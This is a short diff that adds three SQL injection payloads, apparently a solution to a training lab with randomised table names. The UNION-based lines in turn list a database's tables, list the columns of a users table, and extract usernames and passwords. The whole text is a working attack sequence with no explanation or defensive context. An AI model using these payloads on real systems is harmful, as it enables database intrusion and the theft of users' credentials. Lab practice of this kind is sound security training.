@@ -1,0 +1,3 @@
+'union select table_name,NULL from information_schema.tables--
+'union select column_name,NULL from information_schema.columns where table_name='users_mvhhwk'--
+'union select username_htsjvj,password_fmitxn from users_mvhhwk--
